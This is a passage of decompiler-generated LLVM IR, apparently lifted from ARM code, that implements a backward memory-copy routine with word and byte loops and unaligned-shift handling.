  %v0_14208 = phi i32 [ %v0_14208.pre, %dec_label_pc_14208.dec_label_pc_14208_crit_edge ], [ %v0_1420835, %dec_label_pc_141fc ]
  %v1_14208 = add i32 %v0_14208, -4
  %v2_14208 = inttoptr i32 %v1_14208 to i32*
  %v3_14208 = load i32, i32* %v2_14208, align 4
  %v4_14208 = add i32 %v0_14208, -8
  %v5_14208 = inttoptr i32 %v4_14208 to i32*
  %v6_14208 = load i32, i32* %v5_14208, align 4
  store i32 %v6_14208, i32* %r4.global-to-local, align 4
  %v7_14208 = add i32 %v0_14208, -12
  %v8_14208 = inttoptr i32 %v7_14208 to i32*
  %v9_14208 = load i32, i32* %v8_14208, align 4
  store i32 %v9_14208, i32* %ip.global-to-local, align 4
  %v10_14208 = add i32 %v0_14208, -16
  %v11_14208 = inttoptr i32 %v10_14208 to i32*
  %v12_14208 = load i32, i32* %v11_14208, align 4
  store i32 %v12_14208, i32* %lr.global-to-local, align 4
  store i32 %v10_14208, i32* %r1.global-to-local, align 4
  %v1_1420c = add i32 %v0_1420c, -16
  %v2_1420c = inttoptr i32 %v1_1420c to i32*
  store i32 %v3_14208, i32* %v2_1420c, align 4
  %v4_1420c = add i32 %v0_1420c, -12
  %v5_1420c = inttoptr i32 %v4_1420c to i32*
  %v6_1420c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_1420c, i32* %v5_1420c, align 4
  %v7_1420c = add i32 %v0_1420c, -8
  %v8_1420c = inttoptr i32 %v7_1420c to i32*
  %v9_1420c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_1420c, i32* %v8_1420c, align 4
  %v10_1420c = add i32 %v0_1420c, -4
  %v11_1420c = inttoptr i32 %v10_1420c to i32*
  %v12_1420c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1420c, i32* %v11_1420c, align 4
  store i32 %v1_1420c, i32* %r0.global-to-local, align 4
  %v0_14210 = load i32, i32* %r1.global-to-local, align 4
  %v1_14210 = add i32 %v0_14210, -4
  %v2_14210 = inttoptr i32 %v1_14210 to i32*
  %v3_14210 = load i32, i32* %v2_14210, align 4
  store i32 %v3_14210, i32* @r3, align 4
  %v4_14210 = add i32 %v0_14210, -8
  %v5_14210 = inttoptr i32 %v4_14210 to i32*
  %v6_14210 = load i32, i32* %v5_14210, align 4
  store i32 %v6_14210, i32* %r4.global-to-local, align 4
  %v7_14210 = add i32 %v0_14210, -12
  %v8_14210 = inttoptr i32 %v7_14210 to i32*
  %v9_14210 = load i32, i32* %v8_14210, align 4
  store i32 %v9_14210, i32* @ip, align 4
  %v10_14210 = add i32 %v0_14210, -16
  %v11_14210 = inttoptr i32 %v10_14210 to i32*
  %v12_14210 = load i32, i32* %v11_14210, align 4
  store i32 %v12_14210, i32* %lr.global-to-local, align 4
  store i32 %v10_14210, i32* %r1.global-to-local, align 4
  %v1_14214 = add i32 %v0_1420c, -32
  %v2_14214 = inttoptr i32 %v1_14214 to i32*
  store i32 %v3_14210, i32* %v2_14214, align 4
  %v4_14214 = add i32 %v0_1420c, -28
  %v5_14214 = inttoptr i32 %v4_14214 to i32*
  %v6_14214 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_14214, i32* %v5_14214, align 4
  %v7_14214 = add i32 %v0_1420c, -24
  %v8_14214 = inttoptr i32 %v7_14214 to i32*
  %v9_14214 = load i32, i32* @ip, align 4
  store i32 %v9_14214, i32* %v8_14214, align 4
  %v10_14214 = add i32 %v0_1420c, -20
  %v11_14214 = inttoptr i32 %v10_14214 to i32*
  %v12_14214 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_14214, i32* %v11_14214, align 4
  store i32 %v1_14214, i32* %r0.global-to-local, align 4
  %v0_14218 = load i32, i32* %r2.global-to-local, align 4
  %v2_14218 = add i32 %v0_14218, -32
  store i32 %v2_14218, i32* %r2.global-to-local, align 4
  %v6_1421c = icmp slt i32 %v0_14218, 32
  br i1 %v6_1421c, label %dec_label_pc_14220.loopexit, label %dec_label_pc_14208.dec_label_pc_14208_crit_edge

dec_label_pc_14208.dec_label_pc_14208_crit_edge:  ; preds = %dec_label_pc_14208
  %v0_14208.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14208

dec_label_pc_14220.loopexit:                      ; preds = %dec_label_pc_14208
  %v4_14218 = sub i32 31, %v0_14218
  %v5_14218 = and i32 %v4_14218, %v0_14218
  %v6_14218 = icmp slt i32 %v5_14218, 0
  %v7_14218 = icmp slt i32 %v2_14218, 0
  store i1 %v6_14218, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_14218, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_14220

dec_label_pc_14220:                               ; preds = %dec_label_pc_14220.loopexit, %dec_label_pc_141fc
  %v6_14228 = phi i32 [ %v1_14214, %dec_label_pc_14220.loopexit ], [ %v0_1420c36, %dec_label_pc_141fc ]
  %v0_14230.pr = phi i32 [ %v2_14218, %dec_label_pc_14220.loopexit ], [ %v2_14200, %dec_label_pc_141fc ]
  %v4_14220 = add i32 %v0_14230.pr, 16
  %v6_14220 = sub i32 0, %v0_14230.pr
  %v7_14220 = and i32 %v4_14220, %v6_14220
  %v8_14220 = icmp slt i32 %v7_14220, 0
  store i1 %v8_14220, i1* %cpsr_v.global-to-local, align 1
  %v9_14220 = icmp slt i32 %v4_14220, 0
  store i1 %v9_14220, i1* %cpsr_n.global-to-local, align 1
  %v10_14220 = icmp eq i32 %v4_14220, 0
  store i1 %v10_14220, i1* %cpsr_z.global-to-local, align 1
  %v5_14224 = icmp slt i32 %v0_14230.pr, -16
  br i1 %v5_14224, label %.thread1, label %bb147

bb147:                                            ; preds = %dec_label_pc_14220
  %v6_14224 = load i32, i32* %r1.global-to-local, align 4
  %v7_14224 = add i32 %v6_14224, -4
  %v8_14224 = inttoptr i32 %v7_14224 to i32*
  %v9_14224 = load i32, i32* %v8_14224, align 4
  store i32 %v9_14224, i32* @r3, align 4
  %v10_14224 = add i32 %v6_14224, -8
  %v11_14224 = inttoptr i32 %v10_14224 to i32*
  %v12_14224 = load i32, i32* %v11_14224, align 4
  store i32 %v12_14224, i32* %r4.global-to-local, align 4
  %v13_14224 = add i32 %v6_14224, -12
  %v14_14224 = inttoptr i32 %v13_14224 to i32*
  %v15_14224 = load i32, i32* %v14_14224, align 4
  store i32 %v15_14224, i32* @ip, align 4
  %v16_14224 = add i32 %v6_14224, -16
  %v17_14224 = inttoptr i32 %v16_14224 to i32*
  %v18_14224 = load i32, i32* %v17_14224, align 4
  store i32 %v18_14224, i32* %lr.global-to-local, align 4
  store i32 %v16_14224, i32* %r1.global-to-local, align 4
  %v7_14228 = add i32 %v6_14228, -16
  %v8_14228 = inttoptr i32 %v7_14228 to i32*
  store i32 %v9_14224, i32* %v8_14228, align 4
  %v10_14228 = add i32 %v6_14228, -12
  %v11_14228 = inttoptr i32 %v10_14228 to i32*
  %v12_14228 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_14228, i32* %v11_14228, align 4
  %v13_14228 = add i32 %v6_14228, -8
  %v14_14228 = inttoptr i32 %v13_14228 to i32*
  %v15_14228 = load i32, i32* @ip, align 4
  store i32 %v15_14228, i32* %v14_14228, align 4
  %v16_14228 = add i32 %v6_14228, -4
  %v17_14228 = inttoptr i32 %v16_14228 to i32*
  %v18_14228 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_14228, i32* %v17_14228, align 4
  store i32 %v7_14228, i32* %r0.global-to-local, align 4
  %v6_1422c = load i32, i32* %r2.global-to-local, align 4
  %v7_1422c = add i32 %v6_1422c, -16
  store i32 %v7_1422c, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_14220, %bb147
  %v6_14238 = phi i32 [ %v7_14228, %bb147 ], [ %v6_14228, %dec_label_pc_14220 ]
  %v0_14230 = phi i32 [ %v7_1422c, %bb147 ], [ %v0_14230.pr, %dec_label_pc_14220 ]
  %v4_14230 = add i32 %v0_14230, 20
  store i32 %v4_14230, i32* %r2.global-to-local, align 4
  %v6_14230 = sub i32 0, %v0_14230
  %v7_14230 = and i32 %v4_14230, %v6_14230
  %v8_14230 = icmp slt i32 %v7_14230, 0
  store i1 %v8_14230, i1* %cpsr_v.global-to-local, align 1
  %v9_14230 = icmp slt i32 %v4_14230, 0
  store i1 %v9_14230, i1* %cpsr_n.global-to-local, align 1
  %v10_14230 = icmp eq i32 %v4_14230, 0
  store i1 %v10_14230, i1* %cpsr_z.global-to-local, align 1
  %v5_14234 = icmp slt i32 %v0_14230, -20
  br i1 %v5_14234, label %.thread3, label %bb148

bb148:                                            ; preds = %.thread1
  %v6_14234 = load i32, i32* %r1.global-to-local, align 4
  %v7_14234 = add i32 %v6_14234, -4
  %v8_14234 = inttoptr i32 %v7_14234 to i32*
  %v9_14234 = load i32, i32* %v8_14234, align 4
  store i32 %v9_14234, i32* @r3, align 4
  %v10_14234 = add i32 %v6_14234, -8
  %v11_14234 = inttoptr i32 %v10_14234 to i32*
  %v12_14234 = load i32, i32* %v11_14234, align 4
  store i32 %v12_14234, i32* @ip, align 4
  %v13_14234 = add i32 %v6_14234, -12
  %v14_14234 = inttoptr i32 %v13_14234 to i32*
  %v15_14234 = load i32, i32* %v14_14234, align 4
  store i32 %v15_14234, i32* %lr.global-to-local, align 4
  store i32 %v13_14234, i32* %r1.global-to-local, align 4
  %v7_14238 = add i32 %v6_14238, -12
  %v8_14238 = inttoptr i32 %v7_14238 to i32*
  store i32 %v9_14234, i32* %v8_14238, align 4
  %v10_14238 = add i32 %v6_14238, -8
  %v11_14238 = inttoptr i32 %v10_14238 to i32*
  %v12_14238 = load i32, i32* @ip, align 4
  store i32 %v12_14238, i32* %v11_14238, align 4
  %v13_14238 = add i32 %v6_14238, -4
  %v14_14238 = inttoptr i32 %v13_14238 to i32*
  %v15_14238 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_14238, i32* %v14_14238, align 4
  store i32 %v7_14238, i32* %r0.global-to-local, align 4
  %v6_1423c = load i32, i32* %r2.global-to-local, align 4
  %v7_1423c = add i32 %v6_1423c, -12
  store i32 %v7_1423c, i32* %r2.global-to-local, align 4
  br label %.thread3

.thread3:                                         ; preds = %.thread1, %bb148
  %v6_1425c44 = phi i32 [ %v6_14238, %.thread1 ], [ %v7_14238, %bb148 ]
  %v0_1424442 = phi i32 [ %v4_14230, %.thread1 ], [ %v7_1423c, %bb148 ]
  %v2_14240 = load i8*, i8** %stack_var_-8, align 4
  %v3_14240 = ptrtoint i8* %v2_14240 to i32
  store i32 %v3_14240, i32* @r4, align 4
  store i32 %v8_141fc, i32* @lr, align 4
  br label %dec_label_pc_14244

dec_label_pc_14244:                               ; preds = %dec_label_pc_141f4, %.thread3
  %v7_14254 = phi i32 [ %v0_1420c36, %dec_label_pc_141f4 ], [ %v6_1425c44, %.thread3 ]
  %v0_14244 = phi i32 [ %v2_141f4, %dec_label_pc_141f4 ], [ %v0_1424442, %.thread3 ]
  %v2_14244 = add i32 %v0_14244, 8
  store i32 %v2_14244, i32* %r2.global-to-local, align 4
  %v4_14244 = sub i32 0, %v0_14244
  %v5_14244 = and i32 %v2_14244, %v4_14244
  %v6_14244 = icmp slt i32 %v5_14244, 0
  store i1 %v6_14244, i1* %cpsr_v.global-to-local, align 1
  %v7_14244 = icmp slt i32 %v2_14244, 0
  store i1 %v7_14244, i1* %cpsr_n.global-to-local, align 1
  %v8_14244 = icmp eq i32 %v2_14244, 0
  store i1 %v8_14244, i1* %cpsr_z.global-to-local, align 1
  %v5_14248 = icmp slt i32 %v0_14244, -8
  br i1 %v5_14248, label %bb150, label %dec_label_pc_1424c

dec_label_pc_1424c:                               ; preds = %dec_label_pc_14244
  %v6_1424c = add i32 %v0_14244, 4
  store i32 %v6_1424c, i32* %r2.global-to-local, align 4
  %v8_1424c = sub i32 -5, %v0_14244
  %v9_1424c = and i32 %v8_1424c, %v2_14244
  %v10_1424c = icmp slt i32 %v9_1424c, 0
  store i1 %v10_1424c, i1* %cpsr_v.global-to-local, align 1
  %v11_1424c = icmp slt i32 %v6_1424c, 0
  store i1 %v11_1424c, i1* %cpsr_n.global-to-local, align 1
  %v12_1424c = icmp eq i32 %v2_14244, 4
  store i1 %v12_1424c, i1* %cpsr_z.global-to-local, align 1
  %v5_14250 = icmp slt i32 %v2_14244, 4
  %v6_14250 = load i32, i32* %r1.global-to-local, align 4
  %v7_14250 = add i32 %v6_14250, -4
  %v8_14250 = inttoptr i32 %v7_14250 to i32*
  %v9_14250 = load i32, i32* %v8_14250, align 4
  store i32 %v9_14250, i32* @r3, align 4
  br i1 %v5_14250, label %.thread7, label %bb149

.thread7:                                         ; preds = %dec_label_pc_1424c
  store i32 %v7_14250, i32* %r1.global-to-local, align 4
  %v8_14254 = add i32 %v7_14254, -4
  %v9_14254 = inttoptr i32 %v8_14254 to i32*
  store i32 %v9_14250, i32* %v9_14254, align 4
  %v10_14254 = load i32, i32* %r0.global-to-local, align 4
  %v11_14254 = add i32 %v10_14254, -4
  store i32 %v11_14254, i32* %r0.global-to-local, align 4
  %v0_14264.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb150

bb149:                                            ; preds = %dec_label_pc_1424c
  %v10_14258 = add i32 %v6_14250, -8
  %v11_14258 = inttoptr i32 %v10_14258 to i32*
  %v12_14258 = load i32, i32* %v11_14258, align 4
  store i32 %v12_14258, i32* @ip, align 4
  store i32 %v10_14258, i32* %r1.global-to-local, align 4
  %v7_1425c = add i32 %v7_14254, -8
  %v8_1425c = inttoptr i32 %v7_1425c to i32*
  store i32 %v9_14250, i32* %v8_1425c, align 4
  %v10_1425c = add i32 %v7_14254, -4
  %v11_1425c = inttoptr i32 %v10_1425c to i32*
  %v12_1425c = load i32, i32* @ip, align 4
  store i32 %v12_1425c, i32* %v11_1425c, align 4
  store i32 %v7_1425c, i32* %r0.global-to-local, align 4
  %v6_14260 = load i32, i32* %r2.global-to-local, align 4
  %v7_14260 = add i32 %v6_14260, -4
  store i32 %v7_14260, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %.thread7, %dec_label_pc_14244, %dec_label_pc_141d4, %.thread13, %dec_label_pc_14408, %dec_label_pc_1439c, %dec_label_pc_14330, %bb149
  %v2_14268 = phi i32 [ %v11_14254, %.thread7 ], [ %v7_14254, %dec_label_pc_14244 ], [ %v2_141d8, %dec_label_pc_141d4 ], [ %v0_1430019, %.thread13 ], [ %v2_1427452, %dec_label_pc_14408 ], [ %v2_1427451, %dec_label_pc_1439c ], [ %v2_1427450, %dec_label_pc_14330 ], [ %v7_1425c, %bb149 ]
  %v0_14264 = phi i32 [ %v0_14264.pre, %.thread7 ], [ %v2_14244, %dec_label_pc_14244 ], [ %v2_141dc, %dec_label_pc_141d4 ], [ %v2_142a8, %.thread13 ], [ %v0_1426448, %dec_label_pc_14408 ], [ %v0_1426447, %dec_label_pc_1439c ], [ %v0_1426446, %dec_label_pc_14330 ], [ %v7_14260, %bb149 ]
  %v1_14264 = add i32 %v0_14264, 4
  store i32 %v1_14264, i32* @r2, align 4
  %v3_14264 = sub i32 0, %v0_14264
  %v4_14264 = and i32 %v1_14264, %v3_14264
  %v5_14264 = icmp slt i32 %v4_14264, 0
  store i1 %v5_14264, i1* %cpsr_v.global-to-local, align 1
  %v6_14264 = icmp slt i32 %v1_14264, 0
  store i1 %v6_14264, i1* %cpsr_n.global-to-local, align 1
  %v7_14264 = icmp eq i32 %v1_14264, 0
  store i1 %v7_14264, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14264, label %.thread129, label %bb151

bb151:                                            ; preds = %bb150
  %v1_1426c = add i32 %v0_14264, 2
  %v3_1426c = sub i32 -3, %v0_14264
  %v4_1426c = and i32 %v3_1426c, %v1_14264
  %v5_1426c = icmp slt i32 %v4_1426c, 0
  store i1 %v5_1426c, i1* %cpsr_v.global-to-local, align 1
  %v6_1426c = icmp slt i32 %v1_1426c, 0
  store i1 %v6_1426c, i1* %cpsr_n.global-to-local, align 1
  %v7_1426c = icmp eq i32 %v1_14264, 2
  store i1 %v7_1426c, i1* %cpsr_z.global-to-local, align 1
  %v0_14270 = load i32, i32* %r1.global-to-local, align 4
  %v1_14270 = add i32 %v0_14270, -1
  %v2_14270 = inttoptr i32 %v1_14270 to i8*
  %v3_14270 = load i8, i8* %v2_14270, align 1
  %v4_14270 = zext i8 %v3_14270 to i32
  store i32 %v4_14270, i32* @r3, align 4
  store i32 %v1_14270, i32* %r1.global-to-local, align 4
  %v3_14274 = add i32 %v2_14268, -1
  %v4_14274 = inttoptr i32 %v3_14274 to i8*
  store i8 %v3_14270, i8* %v4_14274, align 1
  %v5_14274 = load i32, i32* %r0.global-to-local, align 4
  %v6_14274 = add i32 %v5_14274, -1
  store i32 %v6_14274, i32* %r0.global-to-local, align 4
  %v0_14278 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_14278 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_14278 = xor i1 %v0_14278, %v1_14278
  br i1 %v2_14278, label %.thread128, label %bb152

bb152:                                            ; preds = %bb151
  %v3_14278 = load i32, i32* %r1.global-to-local, align 4
  %v4_14278 = add i32 %v3_14278, -1
  %v5_14278 = inttoptr i32 %v4_14278 to i8*
  %v6_14278 = load i8, i8* %v5_14278, align 1
  %v7_14278 = zext i8 %v6_14278 to i32
  store i32 %v7_14278, i32* @r3, align 4
  store i32 %v4_14278, i32* %r1.global-to-local, align 4
  %v6_1427c = add i32 %v5_14274, -2
  %v7_1427c = inttoptr i32 %v6_1427c to i8*
  store i8 %v6_14278, i8* %v7_1427c, align 1
  %v8_1427c = load i32, i32* %r0.global-to-local, align 4
  %v9_1427c = add i32 %v8_1427c, -1
  store i32 %v9_1427c, i32* %r0.global-to-local, align 4
  %v1_14280.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_14280.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread128

.thread128:                                       ; preds = %bb151, %bb152
  %v7_14284 = phi i32 [ %v9_1427c, %bb152 ], [ %v6_14274, %bb151 ]
  %v2_14284 = phi i1 [ %v2_14280.pre, %bb152 ], [ %v1_14278, %bb151 ]
  %v1_14284 = phi i1 [ %v1_14280.pre, %bb152 ], [ %v0_14278, %bb151 ]
  %v0_14280 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_14280 = xor i1 %v2_14284, %v1_14284
  %v4_14280 = or i1 %v0_14280, %v3_14280
  br i1 %v4_14280, label %.thread129, label %bb153

bb153:                                            ; preds = %.thread128
  %v5_14280 = load i32, i32* %r1.global-to-local, align 4
  %v6_14280 = add i32 %v5_14280, -1
  %v7_14280 = inttoptr i32 %v6_14280 to i8*
  %v8_14280 = load i8, i8* %v7_14280, align 1
  %v9_14280 = zext i8 %v8_14280 to i32
  store i32 %v9_14280, i32* @r3, align 4
  store i32 %v6_14280, i32* %r1.global-to-local, align 4
  %v8_14284 = add i32 %v7_14284, -1
  %v9_14284 = inttoptr i32 %v8_14284 to i8*
  store i8 %v8_14280, i8* %v9_14284, align 1
  %v10_14284 = load i32, i32* %r0.global-to-local, align 4
  %v11_14284 = add i32 %v10_14284, -1
  store i32 %v11_14284, i32* %r0.global-to-local, align 4
  br label %.thread129

dec_label_pc_1428c:                               ; preds = %dec_label_pc_141e4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_1428c = icmp eq i32 %v1_141e4, 1
  store i1 %v8_1428c, i1* %cpsr_n.global-to-local, align 1
  %v9_1428c = icmp eq i32 %v1_141e4, 2
  store i1 %v9_1428c, i1* %cpsr_z.global-to-local, align 1
  %v1_14290 = add i32 %v2_141d4, -1
  %v2_14290 = inttoptr i32 %v1_14290 to i8*
  %v3_14290 = load i8, i8* %v2_14290, align 1
  %v4_14290 = zext i8 %v3_14290 to i32
  store i32 %v4_14290, i32* @r3, align 4
  store i32 %v1_14290, i32* %r1.global-to-local, align 4
  %v3_14294 = add i32 %v2_141d8, -1
  %v4_14294 = inttoptr i32 %v3_14294 to i8*
  store i8 %v3_14290, i8* %v4_14294, align 1
  %v5_14294 = load i32, i32* %r0.global-to-local, align 4
  %v6_14294 = add i32 %v5_14294, -1
  store i32 %v6_14294, i32* %r0.global-to-local, align 4
  br i1 %v8_1428c, label %.thread13, label %bb154

bb154:                                            ; preds = %dec_label_pc_1428c
  %v6_14298 = load i32, i32* %r1.global-to-local, align 4
  %v7_14298 = add i32 %v6_14298, -1
  %v8_14298 = inttoptr i32 %v7_14298 to i8*
  %v9_14298 = load i8, i8* %v8_14298, align 1
  %v10_14298 = zext i8 %v9_14298 to i32
  store i32 %v10_14298, i32* @r3, align 4
  store i32 %v7_14298, i32* %r1.global-to-local, align 4
  %v9_1429c = add i32 %v5_14294, -2
  %v10_1429c = inttoptr i32 %v9_1429c to i8*
  store i8 %v9_14298, i8* %v10_1429c, align 1
  %v11_1429c = load i32, i32* %r0.global-to-local, align 4
  %v12_1429c = add i32 %v11_1429c, -1
  store i32 %v12_1429c, i32* %r0.global-to-local, align 4
  br i1 %v9_1428c, label %.thread13, label %bb155

bb155:                                            ; preds = %bb154
  %v8_142a0 = load i32, i32* %r1.global-to-local, align 4
  %v9_142a0 = add i32 %v8_142a0, -1
  %v10_142a0 = inttoptr i32 %v9_142a0 to i8*
  %v11_142a0 = load i8, i8* %v10_142a0, align 1
  %v12_142a0 = zext i8 %v11_142a0 to i32
  store i32 %v12_142a0, i32* @r3, align 4
  store i32 %v9_142a0, i32* %r1.global-to-local, align 4
  %v11_142a4 = add i32 %v11_1429c, -2
  %v12_142a4 = inttoptr i32 %v11_142a4 to i8*
  store i8 %v11_142a0, i8* %v12_142a4, align 1
  %v13_142a4 = load i32, i32* %r0.global-to-local, align 4
  %v14_142a4 = add i32 %v13_142a4, -1
  store i32 %v14_142a4, i32* %r0.global-to-local, align 4
  br label %.thread13

.thread13:                                        ; preds = %bb154, %dec_label_pc_1428c, %bb155
  %v0_1430019 = phi i32 [ %v12_1429c, %bb154 ], [ %v6_14294, %dec_label_pc_1428c ], [ %v14_142a4, %bb155 ]
  %v0_142a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_142a8 = load i32, i32* @ip, align 4
  %v2_142a8 = sub i32 %v0_142a8, %v1_142a8
  store i32 %v2_142a8, i32* %r2.global-to-local, align 4
  %v4_142a8 = xor i32 %v1_142a8, %v0_142a8
  %v5_142a8 = xor i32 %v2_142a8, %v0_142a8
  %v6_142a8 = and i32 %v5_142a8, %v4_142a8
  %v7_142a8 = icmp slt i32 %v6_142a8, 0
  store i1 %v7_142a8, i1* %cpsr_v.global-to-local, align 1
  %v8_142a8 = icmp slt i32 %v2_142a8, 0
  store i1 %v8_142a8, i1* %cpsr_n.global-to-local, align 1
  %v9_142a8 = icmp eq i32 %v0_142a8, %v1_142a8
  store i1 %v9_142a8, i1* %cpsr_z.global-to-local, align 1
  %v5_142ac = icmp slt i32 %v0_142a8, %v1_142a8
  br i1 %v5_142ac, label %bb150, label %dec_label_pc_142b0

dec_label_pc_142b0:                               ; preds = %.thread13
  %v0_142b0 = load i32, i32* %r1.global-to-local, align 4
  %v1_142b0 = urem i32 %v0_142b0, 4
  store i32 %v1_142b0, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_142b0 = icmp eq i32 %v1_142b0, 0
  store i1 %v2_142b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_142b0, label %dec_label_pc_141f4, label %dec_label_pc_142b8

dec_label_pc_142b8:                               ; preds = %dec_label_pc_141ec, %dec_label_pc_142b0
  %v0_1430018 = phi i32 [ %v2_141d8, %dec_label_pc_141ec ], [ %v0_1430019, %dec_label_pc_142b0 ]
  %v0_143ac = phi i32 [ %v2_141dc, %dec_label_pc_141ec ], [ %v2_142a8, %dec_label_pc_142b0 ]
  %v0_142b8 = phi i32 [ %v2_141d4, %dec_label_pc_141ec ], [ %v0_142b0, %dec_label_pc_142b0 ]
  %v0_142c0 = phi i32 [ %v1_141ec, %dec_label_pc_141ec ], [ %v1_142b0, %dec_label_pc_142b0 ]
  %v1_142b8 = and i32 %v0_142b8, -4
  store i32 %v1_142b8, i32* %r1.global-to-local, align 4
  %v1_142bc = inttoptr i32 %v1_142b8 to i32*
  %v2_142bc = load i32, i32* %v1_142bc, align 4
  store i32 %v2_142bc, i32* @r3, align 4
  %v7_142c0 = icmp ult i32 %v0_142c0, 2
  %v2_143a4 = add i32 %v0_143ac, -12
  %v4_143a4 = sub i32 11, %v0_143ac
  %v5_143a4 = and i32 %v4_143a4, %v0_143ac
  %v6_143a4 = icmp slt i32 %v5_143a4, 0
  store i1 %v6_143a4, i1* %cpsr_v.global-to-local, align 1
  %v7_143a4 = icmp slt i32 %v2_143a4, 0
  store i1 %v7_143a4, i1* %cpsr_n.global-to-local, align 1
  %v8_143a4 = icmp eq i32 %v0_143ac, 12
  store i1 %v8_143a4, i1* %cpsr_z.global-to-local, align 1
  %v5_143a8 = icmp slt i32 %v0_143ac, 12
  br i1 %v7_142c0, label %dec_label_pc_143a4, label %dec_label_pc_142c8

dec_label_pc_142c8:                               ; preds = %dec_label_pc_142b8
  %v8_142c0 = icmp eq i32 %v0_142c0, 2
  br i1 %v8_142c0, label %dec_label_pc_14338, label %dec_label_pc_142cc

dec_label_pc_142cc:                               ; preds = %dec_label_pc_142c8
  br i1 %v5_143a8, label %dec_label_pc_14318, label %dec_label_pc_142d4

dec_label_pc_142d4:                               ; preds = %dec_label_pc_142cc
  store i32 %v2_143a4, i32* %r2.global-to-local, align 4
  %v3_142d8 = load i32, i32* @r4, align 4
  store i32 %v3_142d8, i32* %stack_var_-12, align 4
  %v6_142d8 = load i32, i32* @r5, align 4
  %v8_142d8 = inttoptr i32 %v6_142d8 to i8*
  store i8* %v8_142d8, i8** %stack_var_-8, align 4
  %v11_142d8 = load i32, i32* @lr, align 4
  br label %dec_label_pc_142dc

dec_label_pc_142dc:                               ; preds = %dec_label_pc_142dc.dec_label_pc_142dc_crit_edge, %dec_label_pc_142d4
  %v0_14300 = phi i32 [ %v1_14300, %dec_label_pc_142dc.dec_label_pc_142dc_crit_edge ], [ %v0_1430018, %dec_label_pc_142d4 ]
  %v0_142e0 = phi i32 [ %v0_142e0.pre, %dec_label_pc_142dc.dec_label_pc_142dc_crit_edge ], [ %v1_142b8, %dec_label_pc_142d4 ]
  %v0_142dc = phi i32 [ %v0_142dc.pre, %dec_label_pc_142dc.dec_label_pc_142dc_crit_edge ], [ %v2_142bc, %dec_label_pc_142d4 ]
  %v3_142dc = mul i32 %v0_142dc, 256
  store i32 %v3_142dc, i32* %lr.global-to-local, align 4
  %v1_142e0 = add i32 %v0_142e0, -4
  %v2_142e0 = inttoptr i32 %v1_142e0 to i32*
  %v3_142e0 = load i32, i32* %v2_142e0, align 4
  store i32 %v3_142e0, i32* @r3, align 4
  %v4_142e0 = add i32 %v0_142e0, -8
  %v5_142e0 = inttoptr i32 %v4_142e0 to i32*
  %v6_142e0 = load i32, i32* %v5_142e0, align 4
  store i32 %v6_142e0, i32* %r4.global-to-local, align 4
  %v7_142e0 = add i32 %v0_142e0, -12
  %v8_142e0 = inttoptr i32 %v7_142e0 to i32*
  %v9_142e0 = load i32, i32* %v8_142e0, align 4
  store i32 %v9_142e0, i32* %r5.global-to-local, align 4
  %v10_142e0 = add i32 %v0_142e0, -16
  %v11_142e0 = inttoptr i32 %v10_142e0 to i32*
  %v12_142e0 = load i32, i32* %v11_142e0, align 4
  store i32 %v10_142e0, i32* %r1.global-to-local, align 4
  %v4_142e4 = udiv i32 %v12_142e0, 16777216
  %v5_142e4 = or i32 %v4_142e4, %v3_142dc
  store i32 %v5_142e4, i32* %lr.global-to-local, align 4
  %v3_142e8 = mul i32 %v12_142e0, 256
  %v4_142ec = udiv i32 %v9_142e0, 16777216
  %v5_142ec = or i32 %v3_142e8, %v4_142ec
  store i32 %v5_142ec, i32* @ip, align 4
  %v3_142f0 = mul i32 %v9_142e0, 256
  %v4_142f4 = udiv i32 %v6_142e0, 16777216
  %v5_142f4 = or i32 %v3_142f0, %v4_142f4
  store i32 %v5_142f4, i32* %r5.global-to-local, align 4
  %v3_142f8 = mul i32 %v6_142e0, 256
  %v4_142fc = udiv i32 %v3_142e0, 16777216
  %v5_142fc = or i32 %v3_142f8, %v4_142fc
  store i32 %v5_142fc, i32* %r4.global-to-local, align 4
  %v1_14300 = add i32 %v0_14300, -16
  %v2_14300 = inttoptr i32 %v1_14300 to i32*
  store i32 %v5_142fc, i32* %v2_14300, align 4
  %v4_14300 = add i32 %v0_14300, -12
  %v5_14300 = inttoptr i32 %v4_14300 to i32*
  %v6_14300 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_14300, i32* %v5_14300, align 4
  %v7_14300 = add i32 %v0_14300, -8
  %v8_14300 = inttoptr i32 %v7_14300 to i32*
  %v9_14300 = load i32, i32* @ip, align 4
  store i32 %v9_14300, i32* %v8_14300, align 4
  %v10_14300 = add i32 %v0_14300, -4
  %v11_14300 = inttoptr i32 %v10_14300 to i32*
  %v12_14300 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_14300, i32* %v11_14300, align 4
  store i32 %v1_14300, i32* %r0.global-to-local, align 4
  %v0_14304 = load i32, i32* %r2.global-to-local, align 4
  %v2_14304 = add i32 %v0_14304, -16
  store i32 %v2_14304, i32* %r2.global-to-local, align 4
  %v6_14308 = icmp slt i32 %v0_14304, 16
  br i1 %v6_14308, label %dec_label_pc_1430c, label %dec_label_pc_142dc.dec_label_pc_142dc_crit_edge

dec_label_pc_142dc.dec_label_pc_142dc_crit_edge:  ; preds = %dec_label_pc_142dc
